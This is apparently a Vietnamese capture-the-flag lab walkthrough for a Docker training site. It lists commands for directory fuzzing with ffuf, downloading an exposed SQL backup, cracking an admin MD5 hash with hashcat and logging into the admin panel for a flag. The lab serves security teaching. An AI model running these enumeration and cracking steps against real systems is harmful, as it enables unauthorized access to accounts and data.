# Hướng Dẫn Khai Thác Lab: The Leaky Web Root

## 1. Mục tiêu
Mục tiêu của bài lab này là khám phá các thư mục bị ẩn trên web server, tìm kiếm tệp sao lưu database bị lộ, trích xuất mã băm mật khẩu (password hash) và bẻ khóa nó để truy cập vào bảng điều khiển quản trị (admin panel).

---

## 2. Chuẩn bị môi trường (Setup)

Khởi động môi trường lab bằng Docker Compose. Bạn có thể truyền biến môi trường `EMAIL` để cá nhân hóa Flag (nếu không truyền, mặc định sẽ là `admin@example.com`).

```bash
# Khởi động lab với email mặc định
docker compose up -d --build

# HOẶC khởi động với email tùy chỉnh (để thay đổi Flag)
EMAIL=yourname@example.com docker compose up -d --build
```

Sau khi khởi động, website sẽ chạy tại địa chỉ: `http://[VICTIM HOST]:8081`

---

## 3. Các bước thực hiện

### Bước 1: Thu thập thông tin (Reconnaissance)
Truy cập website và kiểm tra các tệp tin thông thường như `robots.txt`.
```bash
curl http://[VICTIM HOST]:8081/robots.txt
```
Bạn sẽ thấy một chỉ dẫn về thư mục `/backup/`.

### Bước 2: Liệt kê thư mục (Directory Enumeration)
Sử dụng các công cụ như `ffuf`, `gobuster` hoặc `dirsearch` để tìm kiếm các thư mục và tệp tin ẩn trên trang chủ. Ở bước này, chúng ta tập trung tìm kiếm các đường dẫn (directories):
```bash
ffuf -u http://[VICTIM HOST]:8081/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
Kết quả mong đợi sẽ tìm ra các thư mục nhạy cảm:
- `/backup`
- `/admin`

### Bước 3: Tìm kiếm tệp sao lưu trong /backup (File Discovery)
Sau khi xác định được thư mục `/backup/`, bạn cần tìm xem bên trong có nội dung gì. Lúc này, hãy thực hiện quét các tệp tin với các phần mở rộng (extensions) phổ biến:
```bash
ffuf -u http://[VICTIM HOST]:8081/backup/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.sql,.bak,.zip
```
Kết quả sẽ trả về tệp: `backup.sql`. Tải tệp này về để phân tích:
```bash
curl http://[VICTIM HOST]:8081/backup/backup.sql -o backup.sql
```

### Bước 4: Trích xuất và bẻ khóa Password Hash
Mở tệp `backup.sql` và tìm thông tin đăng nhập. Bạn sẽ thấy một mã băm MD5 cho user `admin`.
Tiến hành bẻ khóa mã băm:
```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --show 
```
Mật khẩu tìm được là: `password`.

### Bước 5: Tìm trang đăng nhập trong /admin
Tương tự như bước 3, hãy liệt kê các tệp tin bên trong thư mục `/admin/` để tìm trang đăng nhập:
```bash
ffuf -u http://[VICTIM HOST]:8081/admin/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html
```
Bạn sẽ thấy `login.php`. Truy cập `http://[VICTIM HOST]:8081/admin/login.php` và đăng nhập với thông tin đã tìm được ở Bước 4.

### Bước 6: Lấy User Flag
Sau khi đăng nhập thành công, Flag sẽ hiển thị trên màn hình dashboard.

---

## 4. Xác minh Flag Dynamic
Bài lab này sử dụng **flag động**, thay đổi theo ngày và email.

**User Flag:**
```bash
echo -n "$(TZ=Asia/Ho_Chi_Minh date +%d%m%Y)_admin@example.com_leaky_webroot_user" | sha1sum
```
